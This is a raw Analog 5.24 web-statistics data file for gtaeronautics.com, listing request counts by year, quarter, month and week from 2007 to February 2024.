x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	02	16	02	08
x	FR	2007	12	18	17	05
x	LR	2024	02	15	05	58
x	E7	2024	02	16	02	08
x	SR	1706440
x	S7	8778
x	NC	599604
x	C7	0
x	FL	635307
x	F7	415
x	RR	254
x	R7	0
x	NH	109723
x	H7	381
x	BT	57520368399
x	B7	0
1	Rr	102234	5.991	2024
1	Rr	511208	29.958	2023
1	Rr	82334	4.825	2022
1	Rr	98917	5.797	2021
1	Rr	89380	5.238	2020
1	Rr	80088	4.693	2019
1	Rr	68927	4.039	2018
1	Rr	60168	3.526	2017
1	Rr	73316	4.296	2016
1	Rr	80796	4.735	2015
1	Rr	110773	6.491	2014
1	Rr	65173	3.819	2013
1	Rr	60742	3.560	2012
1	Rr	57015	3.341	2011
1	Rr	22139	1.297	2010
1	Rr	69710	4.085	2009
1	Rr	71820	4.209	2008
1	Rr	1700	0.100	2007
1	*BT	R	511208	2023
Q	Rr	102234	5.991	2024	1
Q	Rr	182268	10.681	2023	4
Q	Rr	165939	9.724	2023	3
Q	Rr	135306	7.929	2023	2
Q	Rr	27695	1.623	2023	1
Q	Rr	20307	1.190	2022	4
Q	Rr	20362	1.193	2022	3
Q	Rr	21795	1.277	2022	2
Q	Rr	19870	1.164	2022	1
Q	Rr	21154	1.240	2021	4
Q	Rr	26826	1.572	2021	3
Q	Rr	30675	1.798	2021	2
Q	Rr	20262	1.187	2021	1
Q	Rr	22199	1.301	2020	4
Q	Rr	23882	1.400	2020	3
Q	Rr	21656	1.269	2020	2
Q	Rr	21643	1.268	2020	1
Q	Rr	19098	1.119	2019	4
Q	Rr	19668	1.153	2019	3
Q	Rr	19827	1.162	2019	2
Q	Rr	21495	1.260	2019	1
Q	Rr	18129	1.062	2018	4
Q	Rr	17138	1.004	2018	3
Q	Rr	16928	0.992	2018	2
Q	Rr	16732	0.981	2018	1
Q	Rr	15937	0.934	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	0.986	2017	2
Q	Rr	27400	1.606	2017	1
Q	Rr	22114	1.296	2016	4
Q	Rr	17621	1.033	2016	3
Q	Rr	15878	0.930	2016	2
Q	Rr	17703	1.037	2016	1
Q	Rr	16575	0.971	2015	4
Q	Rr	22104	1.295	2015	3
Q	Rr	22485	1.318	2015	2
Q	Rr	19632	1.150	2015	1
Q	Rr	21142	1.239	2014	4
Q	Rr	22272	1.305	2014	3
Q	Rr	31453	1.843	2014	2
Q	Rr	35906	2.104	2014	1
Q	Rr	16436	0.963	2013	4
Q	Rr	15216	0.892	2013	3
Q	Rr	16545	0.970	2013	2
Q	Rr	16976	0.995	2013	1
Q	Rr	16578	0.971	2012	4
Q	Rr	12511	0.733	2012	3
Q	Rr	15816	0.927	2012	2
Q	Rr	15837	0.928	2012	1
Q	Rr	15444	0.905	2011	4
Q	Rr	17386	1.019	2011	3
Q	Rr	9395	0.551	2011	2
Q	Rr	14790	0.867	2011	1
Q	Rr	1603	0.094	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.823	2010	2
Q	Rr	6489	0.380	2010	1
Q	Rr	16350	0.958	2009	4
Q	Rr	18220	1.068	2009	3
Q	Rr	17115	1.003	2009	2
Q	Rr	18025	1.056	2009	1
Q	Rr	15905	0.932	2008	4
Q	Rr	15660	0.918	2008	3
Q	Rr	22448	1.315	2008	2
Q	Rr	17807	1.044	2008	1
Q	Rr	1700	0.100	2007	4
Q	*BT	R	182268	2023	4
m	Rr	28176	1.651	2024	02
m	Rr	74058	4.340	2024	01
m	Rr	54270	3.180	2023	12
m	Rr	61278	3.591	2023	11
m	Rr	66720	3.910	2023	10
m	Rr	51132	2.996	2023	09
m	Rr	54561	3.197	2023	08
m	Rr	60246	3.531	2023	07
m	Rr	66204	3.880	2023	06
m	Rr	60120	3.523	2023	05
m	Rr	8982	0.526	2023	04
m	Rr	10848	0.636	2023	03
m	Rr	8360	0.490	2023	02
m	Rr	8487	0.497	2023	01
m	Rr	6950	0.407	2022	12
m	Rr	6349	0.372	2022	11
m	Rr	7008	0.411	2022	10
m	Rr	6740	0.395	2022	09
m	Rr	6863	0.402	2022	08
m	Rr	6759	0.396	2022	07
m	Rr	6567	0.385	2022	06
m	Rr	8427	0.494	2022	05
m	Rr	6801	0.399	2022	04
m	Rr	6380	0.374	2022	03
m	Rr	6175	0.362	2022	02
m	Rr	7315	0.429	2022	01
m	Rr	7667	0.449	2021	12
m	Rr	7097	0.416	2021	11
m	Rr	6390	0.374	2021	10
m	Rr	6059	0.355	2021	09
m	Rr	9092	0.533	2021	08
m	Rr	11675	0.684	2021	07
m	Rr	10152	0.595	2021	06
m	Rr	10231	0.600	2021	05
m	Rr	10292	0.603	2021	04
m	Rr	7948	0.466	2021	03
m	Rr	5800	0.340	2021	02
m	Rr	6514	0.382	2021	01
m	Rr	8069	0.473	2020	12
m	Rr	6579	0.386	2020	11
m	Rr	7551	0.443	2020	10
m	Rr	8028	0.470	2020	09
m	Rr	7741	0.454	2020	08
m	Rr	8113	0.475	2020	07
m	Rr	7317	0.429	2020	06
m	Rr	6898	0.404	2020	05
m	Rr	7441	0.436	2020	04
m	Rr	7524	0.441	2020	03
m	Rr	7322	0.429	2020	02
m	Rr	6797	0.398	2020	01
m	Rr	6573	0.385	2019	12
m	Rr	5917	0.347	2019	11
m	Rr	6608	0.387	2019	10
m	Rr	6791	0.398	2019	09
m	Rr	6597	0.387	2019	08
m	Rr	6280	0.368	2019	07
m	Rr	6317	0.370	2019	06
m	Rr	6847	0.401	2019	05
m	Rr	6663	0.390	2019	04
m	Rr	7059	0.414	2019	03
m	Rr	6374	0.374	2019	02
m	Rr	8062	0.472	2019	01
m	Rr	6957	0.408	2018	12
m	Rr	5422	0.318	2018	11
m	Rr	5750	0.337	2018	10
m	Rr	5458	0.320	2018	09
m	Rr	5735	0.336	2018	08
m	Rr	5945	0.348	2018	07
m	Rr	7110	0.417	2018	06
m	Rr	6440	0.377	2018	05
m	Rr	3378	0.198	2018	04
m	Rr	5789	0.339	2018	03
m	Rr	5369	0.315	2018	02
m	Rr	5574	0.327	2018	01
m	Rr	3906	0.229	2017	12
m	Rr	6533	0.383	2017	11
m	Rr	5498	0.322	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.400	2017	05
m	Rr	9999	0.586	2017	04
m	Rr	11887	0.697	2017	03
m	Rr	7941	0.465	2017	02
m	Rr	7572	0.444	2017	01
m	Rr	9483	0.556	2016	12
m	Rr	7121	0.417	2016	11
m	Rr	5510	0.323	2016	10
m	Rr	6288	0.368	2016	09
m	Rr	5888	0.345	2016	08
m	Rr	5445	0.319	2016	07
m	Rr	5042	0.295	2016	06
m	Rr	5495	0.322	2016	05
m	Rr	5341	0.313	2016	04
m	Rr	5558	0.326	2016	03
m	Rr	5548	0.325	2016	02
m	Rr	6597	0.387	2016	01
m	Rr	5574	0.327	2015	12
m	Rr	5330	0.312	2015	11
m	Rr	5671	0.332	2015	10
m	Rr	6196	0.363	2015	09
m	Rr	6788	0.398	2015	08
m	Rr	9120	0.534	2015	07
m	Rr	7156	0.419	2015	06
m	Rr	5694	0.334	2015	05
m	Rr	9635	0.565	2015	04
m	Rr	6215	0.364	2015	03
m	Rr	6084	0.357	2015	02
m	Rr	7333	0.430	2015	01
m	Rr	6608	0.387	2014	12
m	Rr	6997	0.410	2014	11
m	Rr	7537	0.442	2014	10
m	Rr	7043	0.413	2014	09
m	Rr	7324	0.429	2014	08
m	Rr	7905	0.463	2014	07
m	Rr	11654	0.683	2014	06
m	Rr	9211	0.540	2014	05
m	Rr	10588	0.620	2014	04
m	Rr	7817	0.458	2014	03
m	Rr	15229	0.892	2014	02
m	Rr	12860	0.754	2014	01
m	Rr	5325	0.312	2013	12
m	Rr	5513	0.323	2013	11
m	Rr	5598	0.328	2013	10
m	Rr	4655	0.273	2013	09
m	Rr	4938	0.289	2013	08
m	Rr	5623	0.330	2013	07
m	Rr	5492	0.322	2013	06
m	Rr	5211	0.305	2013	05
m	Rr	5842	0.342	2013	04
m	Rr	6068	0.356	2013	03
m	Rr	5055	0.296	2013	02
m	Rr	5853	0.343	2013	01
m	Rr	5688	0.333	2012	12
m	Rr	5477	0.321	2012	11
m	Rr	5413	0.317	2012	10
m	Rr	4331	0.254	2012	09
m	Rr	3866	0.227	2012	08
m	Rr	4314	0.253	2012	07
m	Rr	4655	0.273	2012	06
m	Rr	6047	0.354	2012	05
m	Rr	5114	0.300	2012	04
m	Rr	6128	0.359	2012	03
m	Rr	5430	0.318	2012	02
m	Rr	4279	0.251	2012	01
m	Rr	5548	0.325	2011	12
m	Rr	4779	0.280	2011	11
m	Rr	5117	0.300	2011	10
m	Rr	5431	0.318	2011	09
m	Rr	6256	0.367	2011	08
m	Rr	5699	0.334	2011	07
m	Rr	5420	0.318	2011	06
m	Rr	3975	0.233	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.211	2011	03
m	Rr	5171	0.303	2011	02
m	Rr	6011	0.352	2011	01
m	Rr	1603	0.094	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.240	2010	06
m	Rr	5018	0.294	2010	05
m	Rr	4928	0.289	2010	04
m	Rr	5095	0.299	2010	03
m	Rr	1394	0.082	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.273	2009	12
m	Rr	6187	0.363	2009	11
m	Rr	5498	0.322	2009	10
m	Rr	5066	0.297	2009	09
m	Rr	5718	0.335	2009	08
m	Rr	7436	0.436	2009	07
m	Rr	5685	0.333	2009	06
m	Rr	6120	0.359	2009	05
m	Rr	5310	0.311	2009	04
m	Rr	5515	0.323	2009	03
m	Rr	6123	0.359	2009	02
m	Rr	6387	0.374	2009	01
m	Rr	5763	0.338	2008	12
m	Rr	5420	0.318	2008	11
m	Rr	4722	0.277	2008	10
m	Rr	5435	0.318	2008	09
m	Rr	4843	0.284	2008	08
m	Rr	5382	0.315	2008	07
m	Rr	6082	0.356	2008	06
m	Rr	9946	0.583	2008	05
m	Rr	6420	0.376	2008	04
m	Rr	5431	0.318	2008	03
m	Rr	6469	0.379	2008	02
m	Rr	5907	0.346	2008	01
m	Rr	1700	0.100	2007	12
m	*BT	R	74058	2024	01
W	Rr	4572	0.268	2024	02	11
W	Rr	16860	0.988	2024	02	04
W	Rr	26220	1.537	2024	01	28
W	Rr	14730	0.863	2024	01	21
W	Rr	13098	0.768	2024	01	14
W	Rr	15324	0.898	2024	01	07
W	Rr	12552	0.736	2023	12	31
W	Rr	11406	0.668	2023	12	24
W	Rr	11184	0.655	2023	12	17
W	Rr	13956	0.818	2023	12	10
W	Rr	13644	0.800	2023	12	03
W	Rr	12390	0.726	2023	11	26
W	Rr	11682	0.685	2023	11	19
W	Rr	15756	0.923	2023	11	12
W	Rr	16596	0.973	2023	11	05
W	Rr	16104	0.944	2023	10	29
W	Rr	13980	0.819	2023	10	22
W	Rr	15450	0.905	2023	10	15
W	Rr	14713	0.862	2023	10	08
W	Rr	14285	0.837	2023	10	01
W	Rr	14478	0.848	2023	09	24
W	Rr	11904	0.698	2023	09	17
W	Rr	10968	0.643	2023	09	10
W	Rr	10482	0.614	2023	09	03
W	Rr	10800	0.633	2023	08	27
W	Rr	14568	0.854	2023	08	20
W	Rr	12504	0.733	2023	08	13
W	Rr	12076	0.708	2023	08	06
W	Rr	10997	0.644	2023	07	30
W	Rr	13392	0.785	2023	07	23
W	Rr	13224	0.775	2023	07	16
W	Rr	16128	0.945	2023	07	09
W	Rr	13356	0.783	2023	07	02
W	Rr	12558	0.736	2023	06	25
W	Rr	17082	1.001	2023	06	18
W	Rr	16452	0.964	2023	06	11
W	Rr	15336	0.899	2023	06	04
W	Rr	13482	0.790	2023	05	28
W	Rr	16248	0.952	2023	05	21
W	Rr	15078	0.884	2023	05	14
W	Rr	17181	1.007	2023	05	07
W	Rr	4282	0.251	2023	04	30
W	Rr	2458	0.144	2023	04	23
W	Rr	2269	0.133	2023	04	16
W	Rr	1553	0.091	2023	04	09
W	Rr	2389	0.140	2023	04	02
W	Rr	1701	0.100	2023	03	26
W	Rr	1943	0.114	2023	03	19
W	Rr	2225	0.130	2023	03	12
W	Rr	2192	0.128	2023	03	05
W	Rr	4055	0.238	2023	02	26
W	Rr	2406	0.141	2023	02	19
W	Rr	1898	0.111	2023	02	12
W	Rr	1890	0.111	2023	02	05
W	Rr	1861	0.109	2023	01	29
W	Rr	1686	0.099	2023	01	22
W	Rr	1779	0.104	2023	01	15
W	Rr	1833	0.107	2023	01	08
W	Rr	2226	0.130	2023	01	01
W	Rr	1280	0.075	2022	12	25
W	Rr	1806	0.106	2022	12	18
W	Rr	1773	0.104	2022	12	11
W	Rr	1532	0.090	2022	12	04
W	Rr	1586	0.093	2022	11	27
W	Rr	1093	0.064	2022	11	20
W	Rr	1366	0.080	2022	11	13
W	Rr	1972	0.116	2022	11	06
W	Rr	1396	0.082	2022	10	30
W	Rr	1547	0.091	2022	10	23
W	Rr	1641	0.096	2022	10	16
W	Rr	1747	0.102	2022	10	09
W	Rr	1568	0.092	2022	10	02
W	Rr	1379	0.081	2022	09	25
W	Rr	1695	0.099	2022	09	18
W	Rr	1701	0.100	2022	09	11
W	Rr	1568	0.092	2022	09	04
W	Rr	1562	0.092	2022	08	28
W	Rr	1488	0.087	2022	08	21
W	Rr	1646	0.096	2022	08	14
W	Rr	1430	0.084	2022	08	07
W	Rr	1446	0.085	2022	07	31
W	Rr	1383	0.081	2022	07	24
W	Rr	1661	0.097	2022	07	17
W	Rr	1478	0.087	2022	07	10
W	Rr	1711	0.100	2022	07	03
W	Rr	1804	0.106	2022	06	26
W	Rr	1298	0.076	2022	06	19
W	Rr	1407	0.082	2022	06	12
W	Rr	1396	0.082	2022	06	05
W	Rr	1638	0.096	2022	05	29
W	Rr	1724	0.101	2022	05	22
W	Rr	2427	0.142	2022	05	15
W	Rr	2100	0.123	2022	05	08
W	Rr	1414	0.083	2022	05	01
W	Rr	1865	0.109	2022	04	24
W	Rr	1381	0.081	2022	04	17
W	Rr	1630	0.096	2022	04	10
W	Rr	1670	0.098	2022	04	03
W	Rr	1588	0.093	2022	03	27
W	Rr	1204	0.071	2022	03	20
W	Rr	1350	0.079	2022	03	13
W	Rr	1488	0.087	2022	03	06
W	Rr	1368	0.080	2022	02	27
W	Rr	1481	0.087	2022	02	20
W	Rr	1657	0.097	2022	02	13
W	Rr	1518	0.089	2022	02	06
W	Rr	1787	0.105	2022	01	30
W	Rr	2021	0.118	2022	01	23
W	Rr	1429	0.084	2022	01	16
W	Rr	1693	0.099	2022	01	09
W	Rr	1541	0.090	2022	01	02
W	Rr	1311	0.077	2021	12	26
W	Rr	1839	0.108	2021	12	19
W	Rr	1732	0.101	2021	12	12
W	Rr	2001	0.117	2021	12	05
W	Rr	1641	0.096	2021	11	28
W	Rr	1615	0.095	2021	11	21
W	Rr	1673	0.098	2021	11	14
W	Rr	1625	0.095	2021	11	07
W	Rr	1523	0.089	2021	10	31
W	Rr	1562	0.092	2021	10	24
W	Rr	1474	0.086	2021	10	17
W	Rr	1349	0.079	2021	10	10
W	Rr	1615	0.095	2021	10	03
W	Rr	1598	0.094	2021	09	26
W	Rr	1646	0.096	2021	09	19
W	Rr	1203	0.070	2021	09	12
W	Rr	1106	0.065	2021	09	05
W	Rr	1383	0.081	2021	08	29
W	Rr	1685	0.099	2021	08	22
W	Rr	2071	0.121	2021	08	15
W	Rr	2279	0.134	2021	08	08
W	Rr	2374	0.139	2021	08	01
W	Rr	2543	0.149	2021	07	25
W	Rr	2843	0.167	2021	07	18
W	Rr	2777	0.163	2021	07	11
W	Rr	2756	0.162	2021	07	04
W	Rr	2524	0.148	2021	06	27
W	Rr	2466	0.145	2021	06	20
W	Rr	2262	0.133	2021	06	13
W	Rr	2264	0.133	2021	06	06
W	Rr	2101	0.123	2021	05	30
W	Rr	3009	0.176	2021	05	23
W	Rr	1989	0.117	2021	05	16
W	Rr	2386	0.140	2021	05	09
W	Rr	2138	0.125	2021	05	02
W	Rr	1668	0.098	2021	04	25
W	Rr	2413	0.141	2021	04	18
W	Rr	3035	0.178	2021	04	11
W	Rr	2709	0.159	2021	04	04
W	Rr	1942	0.114	2021	03	28
W	Rr	1666	0.098	2021	03	21
W	Rr	1476	0.086	2021	03	14
W	Rr	1713	0.100	2021	03	07
W	Rr	1777	0.104	2021	02	28
W	Rr	1173	0.069	2021	02	21
W	Rr	1101	0.065	2021	02	14
W	Rr	1699	0.100	2021	02	07
W	Rr	1867	0.109	2021	01	31
W	Rr	1404	0.082	2021	01	24
W	Rr	1564	0.092	2021	01	17
W	Rr	1431	0.084	2021	01	10
W	Rr	1666	0.098	2021	01	03
W	Rr	1926	0.113	2020	12	27
W	Rr	1572	0.092	2020	12	20
W	Rr	1404	0.082	2020	12	13
W	Rr	2272	0.133	2020	12	06
W	Rr	1522	0.089	2020	11	29
W	Rr	1722	0.101	2020	11	22
W	Rr	1580	0.093	2020	11	15
W	Rr	1401	0.082	2020	11	08
W	Rr	1499	0.088	2020	11	01
W	Rr	1470	0.086	2020	10	25
W	Rr	2379	0.139	2020	10	18
W	Rr	1559	0.091	2020	10	11
W	Rr	1729	0.101	2020	10	04
W	Rr	1674	0.098	2020	09	27
W	Rr	1786	0.105	2020	09	20
W	Rr	2200	0.129	2020	09	13
W	Rr	1677	0.098	2020	09	06
W	Rr	1596	0.094	2020	08	30
W	Rr	1833	0.107	2020	08	23
W	Rr	1814	0.106	2020	08	16
W	Rr	2206	0.129	2020	08	09
W	Rr	1397	0.082	2020	08	02
W	Rr	1816	0.106	2020	07	26
W	Rr	1949	0.114	2020	07	19
W	Rr	1532	0.090	2020	07	12
W	Rr	1976	0.116	2020	07	05
W	Rr	1600	0.094	2020	06	28
W	Rr	1627	0.095	2020	06	21
W	Rr	2101	0.123	2020	06	14
W	Rr	1590	0.093	2020	06	07
W	Rr	1492	0.087	2020	05	31
W	Rr	1556	0.091	2020	05	24
W	Rr	1756	0.103	2020	05	17
W	Rr	1568	0.092	2020	05	10
W	Rr	1567	0.092	2020	05	03
W	Rr	1734	0.102	2020	04	26
W	Rr	1675	0.098	2020	04	19
W	Rr	1702	0.100	2020	04	12
W	Rr	1965	0.115	2020	04	05
W	Rr	1329	0.078	2020	03	29
W	Rr	1818	0.107	2020	03	22
W	Rr	1345	0.079	2020	03	15
W	Rr	1581	0.093	2020	03	08
W	Rr	2014	0.118	2020	03	01
W	Rr	1942	0.114	2020	02	23
W	Rr	1748	0.102	2020	02	16
W	Rr	1949	0.114	2020	02	09
W	Rr	1683	0.099	2020	02	02
W	Rr	1436	0.084	2020	01	26
W	Rr	1792	0.105	2020	01	19
W	Rr	1519	0.089	2020	01	12
W	Rr	1420	0.083	2020	01	05
W	Rr	1109	0.065	2019	12	29
W	Rr	1023	0.060	2019	12	22
W	Rr	1584	0.093	2019	12	15
W	Rr	1783	0.104	2019	12	08
W	Rr	1704	0.100	2019	12	01
W	Rr	1178	0.069	2019	11	24
W	Rr	1697	0.099	2019	11	17
W	Rr	1510	0.088	2019	11	10
W	Rr	1383	0.081	2019	11	03
W	Rr	1309	0.077	2019	10	27
W	Rr	1473	0.086	2019	10	20
W	Rr	1519	0.089	2019	10	13
W	Rr	1485	0.087	2019	10	06
W	Rr	1416	0.083	2019	09	29
W	Rr	1499	0.088	2019	09	22
W	Rr	1652	0.097	2019	09	15
W	Rr	1710	0.100	2019	09	08
W	Rr	1485	0.087	2019	09	01
W	Rr	1689	0.099	2019	08	25
W	Rr	1315	0.077	2019	08	18
W	Rr	1619	0.095	2019	08	11
W	Rr	1558	0.091	2019	08	04
W	Rr	1360	0.080	2019	07	28
W	Rr	1191	0.070	2019	07	21
W	Rr	1730	0.101	2019	07	14
W	Rr	1299	0.076	2019	07	07
W	Rr	1339	0.078	2019	06	30
W	Rr	1592	0.093	2019	06	23
W	Rr	1497	0.088	2019	06	16
W	Rr	1450	0.085	2019	06	09
W	Rr	1555	0.091	2019	06	02
W	Rr	1289	0.076	2019	05	26
W	Rr	1863	0.109	2019	05	19
W	Rr	1385	0.081	2019	05	12
W	Rr	1553	0.091	2019	05	05
W	Rr	1655	0.097	2019	04	28
W	Rr	1282	0.075	2019	04	21
W	Rr	1503	0.088	2019	04	14
W	Rr	1623	0.095	2019	04	07
W	Rr	1715	0.101	2019	03	31
W	Rr	1882	0.110	2019	03	24
W	Rr	1464	0.086	2019	03	17
W	Rr	1381	0.081	2019	03	10
W	Rr	1627	0.095	2019	03	03
W	Rr	1773	0.104	2019	02	24
W	Rr	1669	0.098	2019	02	17
W	Rr	1483	0.087	2019	02	10
W	Rr	1391	0.082	2019	02	03
W	Rr	1797	0.105	2019	01	27
W	Rr	1963	0.115	2019	01	20
W	Rr	2029	0.119	2019	01	13
W	Rr	1696	0.099	2019	01	06
W	Rr	1526	0.089	2018	12	30
W	Rr	1226	0.072	2018	12	23
W	Rr	1442	0.085	2018	12	16
W	Rr	1936	0.113	2018	12	09
W	Rr	1809	0.106	2018	12	02
W	Rr	1295	0.076	2018	11	25
W	Rr	1820	0.107	2018	11	18
W	Rr	1802	0.106	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.086	2018	10	28
W	Rr	1106	0.065	2018	10	21
W	Rr	1427	0.084	2018	10	14
W	Rr	1214	0.071	2018	10	07
W	Rr	1168	0.068	2018	09	30
W	Rr	1420	0.083	2018	09	23
W	Rr	1197	0.070	2018	09	16
W	Rr	1388	0.081	2018	09	09
W	Rr	1320	0.077	2018	09	02
W	Rr	1246	0.073	2018	08	26
W	Rr	1214	0.071	2018	08	19
W	Rr	1366	0.080	2018	08	12
W	Rr	1195	0.070	2018	08	05
W	Rr	1346	0.079	2018	07	29
W	Rr	1374	0.081	2018	07	22
W	Rr	1508	0.088	2018	07	15
W	Rr	1522	0.089	2018	07	08
W	Rr	909	0.053	2018	07	01
W	Rr	1444	0.085	2018	06	24
W	Rr	2682	0.157	2018	06	17
W	Rr	1365	0.080	2018	06	10
W	Rr	1329	0.078	2018	06	03
W	Rr	1275	0.075	2018	05	27
W	Rr	1392	0.082	2018	05	20
W	Rr	1321	0.077	2018	05	13
W	Rr	1527	0.089	2018	05	06
W	Rr	1517	0.089	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.080	2018	04	15
W	Rr	1712	0.100	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.090	2018	03	25
W	Rr	1342	0.079	2018	03	18
W	Rr	2429	0.142	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.080	2018	02	25
W	Rr	1308	0.077	2018	02	18
W	Rr	1439	0.084	2018	02	11
W	Rr	1731	0.101	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.084	2018	01	21
W	Rr	1578	0.092	2018	01	14
W	Rr	1471	0.086	2018	01	07
W	Rr	1246	0.073	2017	12	31
W	Rr	1033	0.061	2017	12	24
W	Rr	1103	0.065	2017	12	17
W	Rr	1406	0.082	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.078	2017	11	26
W	Rr	1427	0.084	2017	11	19
W	Rr	1662	0.097	2017	11	12
W	Rr	1414	0.083	2017	11	05
W	Rr	1349	0.079	2017	10	29
W	Rr	1208	0.071	2017	10	22
W	Rr	2013	0.118	2017	10	15
W	Rr	1832	0.107	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.001	2017	05	28
W	Rr	1838	0.108	2017	05	21
W	Rr	1915	0.112	2017	05	14
W	Rr	1676	0.098	2017	05	07
W	Rr	1677	0.098	2017	04	30
W	Rr	2071	0.121	2017	04	23
W	Rr	1978	0.116	2017	04	16
W	Rr	1874	0.110	2017	04	09
W	Rr	3435	0.201	2017	04	02
W	Rr	2619	0.153	2017	03	26
W	Rr	2633	0.154	2017	03	19
W	Rr	2413	0.141	2017	03	12
W	Rr	3092	0.181	2017	03	05
W	Rr	2295	0.134	2017	02	26
W	Rr	2204	0.129	2017	02	19
W	Rr	1869	0.110	2017	02	12
W	Rr	1973	0.116	2017	02	05
W	Rr	1783	0.104	2017	01	29
W	Rr	1768	0.104	2017	01	22
W	Rr	1585	0.093	2017	01	15
W	Rr	1768	0.104	2017	01	08
W	Rr	1740	0.102	2017	01	01
W	Rr	1549	0.091	2016	12	25
W	Rr	2202	0.129	2016	12	18
W	Rr	1812	0.106	2016	12	11
W	Rr	2648	0.155	2016	12	04
W	Rr	2236	0.131	2016	11	27
W	Rr	1321	0.077	2016	11	20
W	Rr	1996	0.117	2016	11	13
W	Rr	1716	0.101	2016	11	06
W	Rr	1564	0.092	2016	10	30
W	Rr	1362	0.080	2016	10	23
W	Rr	1707	0.100	2016	10	16
W	Rr	1696	0.099	2016	10	09
W	Rr	36	0.002	2016	10	02
W	Rr	2002	0.117	2016	09	25
W	Rr	1399	0.082	2016	09	18
W	Rr	1199	0.070	2016	09	11
W	Rr	1326	0.078	2016	09	04
W	Rr	1316	0.077	2016	08	28
W	Rr	1257	0.074	2016	08	21
W	Rr	1208	0.071	2016	08	14
W	Rr	1602	0.094	2016	08	07
W	Rr	1319	0.077	2016	07	31
W	Rr	1796	0.105	2016	07	24
W	Rr	1171	0.069	2016	07	17
W	Rr	1167	0.068	2016	07	10
W	Rr	917	0.054	2016	07	03
W	Rr	920	0.054	2016	06	26
W	Rr	1179	0.069	2016	06	19
W	Rr	1288	0.075	2016	06	12
W	Rr	1237	0.072	2016	06	05
W	Rr	1263	0.074	2016	05	29
W	Rr	1338	0.078	2016	05	22
W	Rr	1184	0.069	2016	05	15
W	Rr	1365	0.080	2016	05	08
W	Rr	974	0.057	2016	05	01
W	Rr	1311	0.077	2016	04	24
W	Rr	1127	0.066	2016	04	17
W	Rr	1248	0.073	2016	04	10
W	Rr	1451	0.085	2016	04	03
W	Rr	987	0.058	2016	03	27
W	Rr	1233	0.072	2016	03	20
W	Rr	1347	0.079	2016	03	13
W	Rr	1347	0.079	2016	03	06
W	Rr	1236	0.072	2016	02	28
W	Rr	1422	0.083	2016	02	21
W	Rr	1085	0.064	2016	02	14
W	Rr	1427	0.084	2016	02	07
W	Rr	1359	0.080	2016	01	31
W	Rr	1708	0.100	2016	01	24
W	Rr	1476	0.086	2016	01	17
W	Rr	1563	0.092	2016	01	10
W	Rr	1381	0.081	2016	01	03
W	Rr	1273	0.075	2015	12	27
W	Rr	1084	0.064	2015	12	20
W	Rr	1344	0.079	2015	12	13
W	Rr	1336	0.078	2015	12	06
W	Rr	1123	0.066	2015	11	29
W	Rr	960	0.056	2015	11	22
W	Rr	1337	0.078	2015	11	15
W	Rr	1400	0.082	2015	11	08
W	Rr	1383	0.081	2015	11	01
W	Rr	1250	0.073	2015	10	25
W	Rr	1366	0.080	2015	10	18
W	Rr	1367	0.080	2015	10	11
W	Rr	1214	0.071	2015	10	04
W	Rr	1152	0.068	2015	09	27
W	Rr	1387	0.081	2015	09	20
W	Rr	1655	0.097	2015	09	13
W	Rr	1526	0.089	2015	09	06
W	Rr	1242	0.073	2015	08	30
W	Rr	1800	0.105	2015	08	23
W	Rr	1527	0.089	2015	08	16
W	Rr	1386	0.081	2015	08	09
W	Rr	1593	0.093	2015	08	02
W	Rr	1567	0.092	2015	07	26
W	Rr	1980	0.116	2015	07	19
W	Rr	2180	0.128	2015	07	12
W	Rr	2008	0.118	2015	07	05
W	Rr	2297	0.135	2015	06	28
W	Rr	1556	0.091	2015	06	21
W	Rr	1380	0.081	2015	06	14
W	Rr	2013	0.118	2015	06	07
W	Rr	1651	0.097	2015	05	31
W	Rr	1224	0.072	2015	05	24
W	Rr	1355	0.079	2015	05	17
W	Rr	1179	0.069	2015	05	10
W	Rr	1436	0.084	2015	05	03
W	Rr	1671	0.098	2015	04	26
W	Rr	1878	0.110	2015	04	19
W	Rr	2326	0.136	2015	04	12
W	Rr	2636	0.154	2015	04	05
W	Rr	2297	0.135	2015	03	29
W	Rr	1237	0.072	2015	03	22
W	Rr	1453	0.085	2015	03	15
W	Rr	1399	0.082	2015	03	08
W	Rr	1287	0.075	2015	03	01
W	Rr	1249	0.073	2015	02	22
W	Rr	1373	0.080	2015	02	15
W	Rr	1790	0.105	2015	02	08
W	Rr	1672	0.098	2015	02	01
W	Rr	1543	0.090	2015	01	25
W	Rr	1463	0.086	2015	01	18
W	Rr	1696	0.099	2015	01	11
W	Rr	1707	0.100	2015	01	04
W	Rr	1833	0.107	2014	12	28
W	Rr	1335	0.078	2014	12	21
W	Rr	1644	0.096	2014	12	14
W	Rr	1541	0.090	2014	12	07
W	Rr	1335	0.078	2014	11	30
W	Rr	1262	0.074	2014	11	23
W	Rr	2009	0.118	2014	11	16
W	Rr	1566	0.092	2014	11	09
W	Rr	1814	0.106	2014	11	02
W	Rr	1452	0.085	2014	10	26
W	Rr	1642	0.096	2014	10	19
W	Rr	1795	0.105	2014	10	12
